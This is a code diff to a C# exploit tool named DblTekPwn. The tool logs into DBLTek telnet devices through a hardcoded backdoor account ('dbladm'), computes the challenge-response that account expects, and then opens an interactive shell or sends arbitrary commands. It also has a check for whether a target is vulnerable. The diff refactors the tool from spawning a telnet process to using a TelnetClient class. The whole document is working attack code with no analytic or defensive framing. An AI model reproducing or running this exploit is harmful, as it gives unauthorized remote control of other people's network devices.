@@ -10,6 +10,8 @@ namespace DblTekPwn
 {
     public class DblTekPwn
     {
+        public static string BACKDOOR_ACCOUNT = "dbladm";
+
         public static string ComputeResponse(int challenge)
         {
             string modified = (challenge + 20139 + (challenge >> 3)).ToString();
@@ -30,141 +32,108 @@ namespace DblTekPwn
             return sb.ToString().ToLower();
         }
 
-        private Process process;
+        private string ip;
+        private int port;
 
         public DblTekPwn(string ip, int port = 23)
         {
-            process = new Process
-            {
-                StartInfo =
-                {
-                    FileName = "telnet",
-                    Arguments = ip,
-                    RedirectStandardInput = true,
-                    RedirectStandardError = true,
-                    RedirectStandardOutput = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    ErrorDialog = false
-                }
-            };
-
-            process.Start();
+            this.ip = ip;
+            this.port = port;
         }
 
         public void Shell()
         {
-            var standardOutput = process.StandardOutput;
-            var standardInput = process.StandardInput;
-            standardInput.AutoFlush = true;
-            standardInput.WriteLine("dbladm");
-            for (int i = 0; i < 8; i++)
-                Console.WriteLine(standardOutput.ReadLine());
-
-            string challengeLine = standardOutput.ReadLine();
-            Console.WriteLine(challengeLine);
-            if (!challengeLine.StartsWith("challenge: N"))
+            Thread outputThread = null;
+            try
             {
-                Console.WriteLine("Device is not vulnerable!");
-                Environment.Exit(0);
+                TelnetClient client = new TelnetClient(ip, port);
+                outputThread = new Thread(() => shellOutputThread(client));
+                client.Write(BACKDOOR_ACCOUNT);
+
+                for (int i = 0; i < 5; i++)
+                    client.Read();
+
+                string challengeLine = client.Read();
+                string response = ComputeResponse(Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1)));
+                client.Write(response);
+                
+                outputThread.Start();
+                while (true)
+                {
+                    client.Write(Console.ReadLine());
+                    skipNextLine = true;
+                }
             }
+            catch
+            {
+                
+            }
+            finally
+            {
+                try
+                {
+                    outputThread.Abort();
+                }
+                catch
+                {
 
-            int challenge = Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1));
-            standardInput.WriteLine(ComputeResponse(challenge));
-
-            new Thread(() => shellOutputThread(standardOutput)).Start();
-            while (true)
-                process.StandardInput.WriteLine(Console.ReadLine());
+                }
+            }
         }
 
-        private void shellOutputThread(TextReader reader)
+        private bool skipNextLine = false;
+        private void shellOutputThread(TelnetClient client)
         {
             while (true)
-                Console.WriteLine(reader.ReadLine());
+            {
+                string line = client.Read();
+                if (skipNextLine)
+                    skipNextLine = false;
+                else
+                    Console.WriteLine(line);
+            }
         }
 
         public bool SendCommands(params string[] commands)
         {
-            Thread checker = new Thread(() => processTimeoutThread(process));
-            checker.Start();
-
             try
             {
-                var standardOutput = process.StandardOutput;
-                var standardInput = process.StandardInput;
-                standardInput.AutoFlush = true;
-                standardInput.WriteLine("dbladm");
-                for (int i = 0; i < 8; i++) standardOutput.ReadLine();
+                TelnetClient client = new TelnetClient(ip, port);
+                client.Write(BACKDOOR_ACCOUNT);
 
-                string challengeLine = standardOutput.ReadLine();
+                for (int i = 0; i < 5; i++)
+                    client.Read();
 
-                if (!challengeLine.StartsWith("challenge: N"))
-                    return false;
-
-                int challenge = Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1));
-                standardInput.WriteLine(ComputeResponse(challenge));
+                string challengeLine = client.Read();
+                string response = ComputeResponse(Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1)));
+                client.Write(response);
 
                 foreach (string command in commands)
-                    standardInput.WriteLine(command);
+                    client.Write(command);
+                return true;
             }
             catch
             {
                 return false;
             }
-            finally
-            {
-                checker.Abort();
-                try
-                {
-                    process.Kill();
-                }
-                catch
-                {
-                }
-            }
-            return true;
         }
 
         public bool TestLogin()
         {
-            Thread checker = new Thread(() => processTimeoutThread(process));
-            checker.Start();
-
             try
             {
-                var standardOutput = process.StandardOutput;
-                var standardInput = process.StandardInput;
-                standardInput.AutoFlush = true;
-                standardInput.WriteLine("dbladm");
-                for (int i = 0; i < 8; i++) standardOutput.ReadLine();
+                TelnetClient client = new TelnetClient(ip, port);
+                client.Write(BACKDOOR_ACCOUNT);
 
-                string challengeLine = standardOutput.ReadLine();
+                for (int i = 0; i < 5; i++)
+                    client.Read();
 
-                if (challengeLine.StartsWith("challenge: N"))
-                    return true;
-                return false;
+                return client.Read().StartsWith("challenge: N");
             }
             catch
             {
                 return false;
             }
-            finally
-            {
-                checker.Abort();
-                try
-                {
-                    process.Kill();
-                }
-                catch
-                {
-                }
-            }
-        }
-
-        private void processTimeoutThread(Process process)
-        {
-            Thread.Sleep(15000);
-            process.Kill();
         }
     }
 }
